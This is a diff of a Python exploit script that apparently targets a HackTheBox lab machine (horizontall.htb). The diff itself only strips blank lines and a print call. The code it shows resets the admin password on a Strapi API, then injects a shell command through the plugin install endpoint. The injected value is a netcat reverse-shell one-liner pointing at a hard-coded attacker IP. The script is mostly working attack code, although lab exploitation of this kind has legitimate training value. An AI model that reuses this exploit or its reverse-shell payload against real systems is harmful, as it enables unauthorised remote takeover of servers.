@@ -35,7 +35,6 @@ signal.signal(signal.SIGINT, def_handler)
 class Exploit:
 
 	def __init__(self, main_url, password, filename):
-
 		self.__url = main_url
 		self.__password = password
 		self.__filename = filename
@@ -47,7 +46,6 @@ class Exploit:
 		shutil.make_archive(self.__filename, 'zip', cwd+'/'+self.__filename)
 
 	def reset_password(self):
-
 		s = requests.session()
 		s.verify = False
 		urllib3.disable_warnings()
@@ -74,20 +72,16 @@ class Exploit:
 			p1.success(f'[Changed password] username admin and password {self.__password}')
 
 	def rce_starpi(self):
-
 		header = { 'Authorization': f'Bearer {jwt}' }
 		
 		# Cambiar IP por la vuestra
-
 		data_plugin = {
 			'plugin': f'documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.78 443 >/tmp/f)',
 			'port': '1337'
 		}
 
 		r = requests.post(self.__url+'/admin/plugins/install', json=data_plugin, headers=header)
-
-		print(r.text)
-
+		
 autopwn = Exploit('http://api-prod.horizontall.htb', 'pass', 'CVE-2021-4034')
 
 def main():
@@ -95,8 +89,6 @@ def main():
 	autopwn.reset_password()
 	autopwn.rce_starpi()
 	
-	
-
 if __name__ == '__main__':
 	try:
 		threading.Thread(target=main, args=()).start()
